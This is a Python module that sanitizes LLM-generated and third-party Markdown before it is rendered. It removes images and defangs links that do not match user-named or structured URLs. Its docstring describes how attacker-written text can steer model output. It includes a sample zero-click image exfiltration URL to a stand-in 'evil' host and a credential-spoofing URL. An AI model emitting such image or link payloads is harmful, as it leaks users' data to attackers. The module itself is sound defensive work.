"""
Make LLM- and third-party-derived Markdown safe to render.

Model output is shaped by text an attacker can write (READMEs, issues, search results), and the UI
renders it as Markdown. Two things follow:

- An image tag loads its URL as soon as the page renders, so `![](https://evil/?leak=...)` can carry
  data out with no click. Images are removed.
- A link can point anywhere while its text says something else. A link is kept only if its URL is
  one the user themselves named, or one that appeared in a structured URL field of a result
  (see collect_urls). Any other link is shown as plain text with the URL visible in a code span, so
  it can be read but not clicked. This covers `[text](url)`, `<url>`, reference-style links, and
  bare `http(s)://` and `www.` URLs, which many renderers turn into links on their own.

The rewrite is done with patterns, and patterns can't recognise every link the renderer would, so the
result is then checked by parsing it with the same CommonMark parser: if any image, ungrounded link or
raw HTML is still present, all link syntax is escaped instead, and if even that fails the text is
withheld. The check fails closed.

Text inside code blocks and single-line code spans is left alone, since it renders literally. Which
lines are code blocks is decided by a CommonMark parser (markdown-it-py) rather than by patterns of our
own, so it agrees with the renderer about block structure. Anything ambiguous is sanitized, never skipped.
"""

import re
from typing import Any, Iterable, Optional
from urllib.parse import urlsplit

try:
    from markdown_it import MarkdownIt

    _PARSER = MarkdownIt("commonmark")
except ImportError:  # sanitize_markdown then fails closed: see the check at the top of it
    _PARSER = None

_PLACEHOLDER = "\x00"
_URL_IN_TEXT = re.compile(r"https?://[^\s<>\[\]()`\"']+", re.IGNORECASE)
_TRAILING_PUNCT = ".,;:!?"

# Single-line only: a span that crosses a line could straddle blocks the renderer sees as separate.
# An opener preceded by a backslash is not treated as a span (so its contents are sanitized): the renderer
# reads an escaped backtick as a literal character.
_CODE_SPAN = re.compile(r"(?<![\\`])(`+)(?!`)([^\n]+?)(?<!`)\1(?!`)")
_REF_DEFINITION = re.compile(r"(?m)^[ ]{0,3}\[[^\]\n]+\]:[ \t]*\S.*$")
_IMAGE_INLINE = re.compile(r"!\[([^\]\n]*)\]\([^)\n]*\)")
_IMAGE_REF = re.compile(r"!\[([^\]\n]*)\]\[[^\]\n]*\]")
# [label](destination "optional title"). The destination is either <...> or a run without spaces or ")".
_LINK_INLINE = re.compile(
    r"(?<![\\!])\[((?:[^\[\]\n]|\[[^\]\n]*\])*)\]\(\s*(?:<([^>\n]*)>|([^)\s]*))(?:\s+(?:\"[^\"\n]*\"|'[^'\n]*'))?\s*\)"
)
_AUTOLINK = re.compile(r"<((?:https?://|www\.)[^\s<>]*)>", re.IGNORECASE)
# No lookbehind on purpose: renderers differ about what may precede an auto-linked URL (whitespace,
# punctuation, sometimes a letter), so a URL is defanged wherever it appears. Over-defanging is harmless.
# A backslash is part of the URL run (browsers read it as "/", so "…/o/r\\..\\x" must not pass as "…/o/r"),
# except right before "<": that is the escape this module itself inserts in front of raw HTML.
_BARE_URL = re.compile(r"((?:https?://|www\.)(?:[^\s<>\[\]()`\"'\\]|\\(?!<))+)", re.IGNORECASE)
# Like _BARE_URL, for the verifier: text is joined with \x01 wherever a non-text token sits between.
_BARE_URL_TEXT = re.compile(r"((?:https?://|www\.)[^\s<>\[\]()`\"'\x01]+)", re.IGNORECASE)
_HTML_TAG_START = re.compile(r"(?<!\\)<(?=/?[A-Za-z!])")


def normalize_url(url: str) -> Optional[str]:
    """
    A canonical form for comparing URLs, or None if this isn't a plain http(s) URL.

    Lower-cases the scheme and host (and the path, for github.com), drops the fragment and a
    trailing slash. URLs carrying
    credentials (https://github.com@evil.com) are rejected, since the visible host is misleading.
    """
    try:
        parts = urlsplit(url.strip())
        host = parts.hostname
        port = parts.port
    except ValueError:
        return None
    if parts.scheme.lower() not in ("http", "https") or not host or "@" in parts.netloc:
        return None
    netloc = host.lower() if port in (None, 80, 443) else f"{host.lower()}:{port}"
    path = parts.path.rstrip("/")
    if host.lower() == "github.com":
        path = path.lower()  # owner and repo names are case-insensitive on GitHub
    return f"{parts.scheme.lower()}://{netloc}{path}" + (f"?{parts.query}" if parts.query else "")


def urls_in_text(text: str) -> set[str]:
    """Normalized http(s) URLs written in `text`. Use only for text the user typed themselves."""
    found = set()
    for raw in _URL_IN_TEXT.findall(text or ""):
        n = normalize_url(raw.rstrip(_TRAILING_PUNCT))
        if n:
            found.add(n)
    return found


def collect_urls(data: Any) -> set[str]:
    """
    Normalized URLs held in structured URL fields of a result: any dict value whose key is "url" or
    ends in "_url". URLs that merely appear inside free text (a README, an issue body, a model's
    prose) are deliberately not collected, since that text is what an attacker writes.
    """
    found: set[str] = set()
    if isinstance(data, dict):
        for key, value in data.items():
            if isinstance(value, str) and (key == "url" or str(key).endswith("_url")):
                n = normalize_url(value)
                if n:
                    found.add(n)
            else:
                found |= collect_urls(value)
    elif isinstance(data, (list, tuple)):
        for item in data:
            found |= collect_urls(item)
    return found


def _is_repo_base(url: str) -> bool:
    parts = urlsplit(url)
    return parts.hostname == "github.com" and len([s for s in parts.path.split("/") if s]) == 2 and not parts.query


def sanitize_markdown(text: str, allowed_urls: Iterable[str] = ()) -> str:
    """
    Return `text` with images removed and every link or URL not grounded in `allowed_urls` defanged.

    `allowed_urls` are compared after normalize_url. A GitHub repo URL among them also allows pages
    under that repo (its files, issues and so on). Safe to apply more than once.
    """
    allowed = {n for n in (normalize_url(u) for u in allowed_urls) if n}
    bases = {u for u in allowed if _is_repo_base(u)}

    def is_allowed(url: str) -> bool:
        n = normalize_url(url)
        return n is not None and (n in allowed or any(n.startswith(b + "/") for b in bases))

    if _PARSER is None:
        # Nothing to verify the rewrite with, so don't rely on it: escape all link syntax instead.
        return _rewrite(text, is_allowed, escape_all=True)

    rewritten = _rewrite(text, is_allowed)
    if not _has_violation(rewritten, is_allowed):
        return rewritten
    escaped = _rewrite(text, is_allowed, escape_all=True)
    if not _has_violation(escaped, is_allowed):
        return escaped
    return "*[Content withheld: it could not be safely rendered.]*"


def _rewrite(text: str, is_allowed, escape_all: bool = False) -> str:
    lines = str(text).replace(_PLACEHOLDER, "").split("\n")
    code_lines = _code_block_lines("\n".join(lines), len(lines))

    out: list[str] = []
    block: list[str] = []  # consecutive non-code lines, sanitized together

    def flush() -> None:
        if block:
            out.extend(_sanitize_block("\n".join(block), is_allowed, escape_all).split("\n"))
            block.clear()

    for i, line in enumerate(lines):
        if i in code_lines:
            flush()
            out.append(line)
        else:
            block.append(line)
    flush()
    return "\n".join(out)


def _has_violation(text: str, is_allowed) -> bool:
    """
    True if parsing `text` as CommonMark finds an image, raw HTML, a link whose target isn't
    allowed, or a URL left in plain text that a renderer would turn into a link. Code blocks and code spans never produce these tokens, so they are ignored naturally.
    """
    if _PARSER is None:
        return True  # cannot verify: treat as unsafe (sanitize_markdown never gets here without a parser)
    try:
        tokens = _PARSER.parse(text)
    except Exception:
        return True
    for token in tokens:
        if token.type == "html_block":
            return True
        parts: list[str] = []
        for child in token.children or []:
            if child.type in ("image", "html_inline"):
                return True
            if child.type == "link_open":
                href = child.attrGet("href")
                if not (isinstance(href, str) and is_allowed(href)):
                    return True
            if child.type == "text":
                parts.append(child.content)
            else:
                parts.append(" " if child.type in ("softbreak", "hardbreak") else "\x01")
        # A URL left in plain text (outside code) is auto-linked by GitHub-flavored renderers.
        for m in _BARE_URL_TEXT.finditer("".join(parts)):
            url = m.group(1).rstrip(_TRAILING_PUNCT)
            if not (url.lower().startswith(("http://", "https://")) and is_allowed(url)):
                return True
    return False


def _code_block_lines(text: str, line_count: int) -> set[int]:
    """Indexes of lines the CommonMark parser puts inside fenced or indented code blocks."""
    if _PARSER is None:
        return set()
    try:
        tokens = _PARSER.parse(text)
    except Exception:
        return set()
    lines: set[int] = set()
    for token in tokens:
        if token.type in ("fence", "code_block") and token.map:
            lines.update(range(token.map[0], min(token.map[1], line_count)))
    return lines


def _defang(url: str, fence_len: int = 1) -> str:
    """
    A URL shown as inert code text: no backticks or newlines, and not absurdly long.

    A code span only pairs with a run of exactly its own length, so `fence_len` is chosen longer than
    any backtick run already in the text: a stray backtick nearby can then never pair with ours and
    leave the URL outside code.
    """
    url = url.replace("`", "").replace("\n", " ").strip()
    fence = "`" * fence_len
    return f"{fence}{url[:120]}{'…' if len(url) > 120 else ''}{fence}"


def _sanitize_block(block: str, is_allowed, escape_all: bool = False) -> str:
    if not block:
        return block
    stash: list[str] = []
    fence_len = max((len(run) for run in re.findall(r"`+", block)), default=0) + 1

    def hold(value: str) -> str:
        stash.append(value)
        return f"{_PLACEHOLDER}{len(stash) - 1}{_PLACEHOLDER}"

    # Code spans render literally: protect them.
    block = _CODE_SPAN.sub(lambda m: hold(m.group(0)), block)

    # Reference-style links can't resolve without their definitions, so drop the definitions.
    block = _REF_DEFINITION.sub("", block)

    # Images: remove entirely (they load without a click), keeping any alt text.
    block = _IMAGE_INLINE.sub(lambda m: m.group(1) or "(image removed)", block)
    block = _IMAGE_REF.sub(lambda m: m.group(1) or "(image removed)", block)

    def defang_bare(text: str) -> str:
        return _BARE_URL.sub(lambda m: _bare(m.group(1)), text)

    def _bare(url: str) -> str:
        stripped = url.rstrip(_TRAILING_PUNCT)
        tail = url[len(stripped):]
        if stripped.lower().startswith(("http://", "https://")) and is_allowed(stripped):
            return hold(stripped) + tail
        return hold(_defang(stripped, fence_len)) + tail

    def link(m: re.Match) -> str:
        label, url = m.group(1), m.group(2) or m.group(3) or ""
        if url and is_allowed(url):
            # The label may itself contain a URL that differs from the target: defang those.
            return hold(f"[{defang_bare(label)}]({url})")
        return f"{label} ({hold(_defang(url, fence_len))})" if url else label

    block = _LINK_INLINE.sub(link, block)

    def autolink(m: re.Match) -> str:
        url = m.group(1)
        if url.lower().startswith(("http://", "https://")) and is_allowed(url):
            return hold(f"<{url}>")
        return hold(_defang(url, fence_len))

    block = _AUTOLINK.sub(autolink, block)
    block = defang_bare(block)

    # Raw HTML: escape the opening angle bracket so it is text, not markup, in any renderer.
    block = _HTML_TAG_START.sub(r"\\<", block)

    if escape_all:
        # Fallback: no link, image or tag syntax at all. Held code spans are restored below.
        block = re.sub(r"(?<!\\)([\[\]()<>!])", r"\\\1", block)

    # Restore held spans. Held values can contain placeholders themselves (a code span in a link label).
    pattern = re.compile(rf"{_PLACEHOLDER}(\d+){_PLACEHOLDER}")

    def restore(text: str, depth: int = 0) -> str:
        out = ""
        pos = 0
        pieces = []
        for m in pattern.finditer(text):
            pieces.append(text[pos : m.start()])
            value = stash[int(m.group(1))]
            pieces.append(restore(value, depth + 1) if depth < 10 else value)
            pos = m.end()
        pieces.append(text[pos:])
        for piece in pieces:
            if piece:
                # Touching backtick runs would merge into one longer run, and a backslash right before a
                # backtick escapes it; either changes which text is code. Keep them apart.
                if out.endswith(("`", "\\")) and piece.startswith("`"):
                    out += " "
                out += piece
        return out

    return restore(block)
